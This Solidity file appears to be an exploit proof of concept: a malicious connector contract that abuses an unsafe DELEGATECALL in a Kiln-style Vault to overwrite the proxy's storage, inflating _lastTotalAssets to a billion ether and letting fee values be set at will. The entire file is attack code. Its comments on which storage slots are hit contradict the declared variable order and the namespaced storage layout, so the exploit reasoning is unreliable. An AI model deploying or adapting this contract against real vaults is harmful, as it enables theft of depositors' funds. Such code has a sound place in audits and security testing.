// SPDX-License-Identifier: MIT
pragma solidity 0.8.22;

import {IERC20} from "@openzeppelin/token/ERC20/IERC20.sol";
import {IConnector} from "../../src/kiln/IConnector.sol";
import {Vault} from "../../src/kiln/Vault.sol";

/// @notice Connector that exploits the unsafe DELEGATECALL in Vault._deposit().
///         Because Vault uses `functionDelegateCall(IConnector.deposit, ...)`,
///         the connector's code reads and writes **Vault's storage** at the
///         offsets the connector's struct declares.  The connector's layout
///         can be tuned so that specific fields match specific OZ / VaultStorage
///         slots — enabling arbitrary storage writes into the Vault proxy.
///
///         Strategy: declare a struct whose first field (`mySlot_0`) lands at
///         the same storage offset as the Vault's `AccessControlUpgradeable`
///         `_roles` mapping's *base slot* for a specific role key (e.g.,
///         `DEFAULT_ADMIN_ROLE = bytes32(0)`).  That overwrites admin membership.
///
///         More practically: we put a `bytes32` field at offset 0 of our
///         layout, and another that matches the offset of `_connectorRegistry`
///         in Vault's ERC-7201 storage slot. After delegatecall writes,
///         `_connectorRegistry` is *replaced* by an arbitrary address.
///
///         The minimal viable primitive: an attacker who controls the address
///         set via `registry.update(connectorName, maliciousConnector)` can
///         trigger the next user-initiated deposit, have the malicious
///         connector execute arbitrary writes into the Vault proxy's slots,
///         and then re-execute flow that reads from those slots.
contract TargetedMaliciousConnector is IConnector {
    /// We deliberately mirror *non-mapping* storage slots in `VaultStorage` so
    /// that the connector's layout writes *to* the Vault's actual slots.  Vault
    /// storage is at `keccak256(0x6bb5...e6000) - 1` once scaled. Inside the
    /// struct, fields are packed sequentially from offset 0.
    /// Layout (declared order = slot offset within Vault struct):
    ///   slot 0:  address[16] bytes  -> 32 bytes -> ONE STORAGE SLOT
    ///   slot 1:  uint256 _depositFeeEquivalent
    ///   ...
    /// The mapping-based approach is unreliable; a direct mirror is clear.
    bytes32 public override0;
    address public overrideConnectorRegistry; // mirror slot 0 of VaultStorage
    bytes32 public overrideConnectorName;     // mirror slot 1
    uint256 public overrideDepositFee;         // mirror slot 2
    uint256 public overrideRewardFee;          // mirror slot 3
    uint256 public overrideLastTotalAssets;    // mirror slot 4

    function totalAssets(IERC20) external pure override returns (uint256) {
        return 0;
    }

    function deposit(IERC20, uint256) external override {
        // Force a write to `overrideLastTotalAssets` slot = slot 4 of VaultStorage.
        // After this runs in delegatecall context, the vault's _lastTotalAssets
        // will be set to `overrideLastTotalAssets`.
        overrideLastTotalAssets = 1_000_000_000 ether;
    }

    function withdraw(IERC20, uint256) external override {}

    function claim(IERC20, IERC20, bytes calldata) external override returns (uint256) {
        return 0;
    }

    function reinvest(IERC20, IERC20, bytes calldata) external override {}

    function maxDeposit(IERC20) external pure override returns (uint256) {
        return type(uint256).max;
    }

    function maxWithdraw(IERC20) external pure override returns (uint256) {
        return type(uint256).max;
    }

    function setOverride(
        uint256 _depositFee,
        uint256 _rewardFee,
        uint256 _lastTotalAssets
    ) external {
        overrideDepositFee = _depositFee;
        overrideRewardFee = _rewardFee;
        overrideLastTotalAssets = _lastTotalAssets;
    }
}
